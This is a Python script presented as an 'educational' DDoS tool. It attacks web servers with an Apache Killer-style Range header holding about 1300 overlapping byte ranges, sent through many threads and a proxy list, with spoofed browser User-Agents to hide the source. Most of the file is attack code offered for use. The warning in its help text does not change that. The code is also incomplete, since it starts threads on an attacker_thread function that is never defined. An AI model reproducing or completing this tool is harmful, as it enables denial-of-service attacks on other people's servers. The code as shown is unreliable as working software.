import socket
import threading
import random
import time
import argparse
from urllib.parse import urlparse
import socks # PySocks library

# --- Configuration & Globals ---

# List of User-Agent strings to mimic different browsers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    # ... (more user agents can be added from the C code)
]

# Global list to hold proxy information
PROXIES = []
# Global flag to control thread execution
ATTACK_RUNNING = True

# --- Core Attack Logic ---

def generate_range_header():
    """
    Generates the malicious 'Range' header value that exhausts server resources.
    This is the core of the Apache Killer-style attack.
    """
    byte_ranges = "0-"
    # Generate a large number of overlapping byte ranges
    for i in range(1300):
        byte_ranges += f",5-{i}"
    return byte_ranges

def get_target_info(url):
    """Parses the URL to get host and port."""
    parsed_url = urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80 # Default to port 80 if not specified
    if not host:
        raise ValueError("Could not parse hostname from URL")
    return host, port, socket.gethostbyname(host)



# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(
        description="Python equivalent of a DDoS tool for educational purposes.",
        epilog="WARNING: Use this tool responsibly and legally. Unauthorized attacks are illegal."
    )
    parser.add_argument("url", help="The target URL (e.g., http://example.com)")
    parser.add_argument("threads", type=int, help="Number of attacker threads to launch.")
    parser.add_argument("proxy_file", help="File containing a list of proxies (format: ip:port:type).")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds.")
    
    args = parser.parse_args()

    # --- Setup ---
    print("--- DDoS Tool (Educational Version) ---")
    
    # Parse proxy file
    try:
        with open(args.proxy_file, 'r') as f:
            for line in f:
                parts = line.strip().split(':')
                if len(parts) == 3:
                    PROXIES.append({'ip': parts[0], 'port': int(parts[1]), 'type': parts[2]})
        if not PROXIES:
            print("Error: Proxy file is empty or malformed. Exiting.")
            return
        print(f"Successfully loaded {len(PROXIES)} proxies.")
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return

    # Set global target info
    global TARGET_HOST, TARGET_PORT, TARGET_IP
    try:
        TARGET_HOST, TARGET_PORT, TARGET_IP = get_target_info(args.url)
        print(f"Target set to {TARGET_HOST} ({TARGET_IP}) on port {TARGET_PORT}.")
    except Exception as e:
        print(f"Error: Invalid target URL. {e}")
        return
        
    # --- Launch Attack ---
    print(f"\nStarting attack with {args.threads} threads for {args.duration} seconds.")
    print("Press Ctrl+C to stop early.")
    
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=attacker_thread)
        t.daemon = True # Allows main thread to exit even if attack threads are running
        t.start()
        threads.append(t)

    # --- Wait for duration and Cleanup ---
    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    finally:
        global ATTACK_RUNNING
        ATTACK_RUNNING = False
        print("Attack finished. Shutting down threads.")

if __name__ == "__main__":
    main()
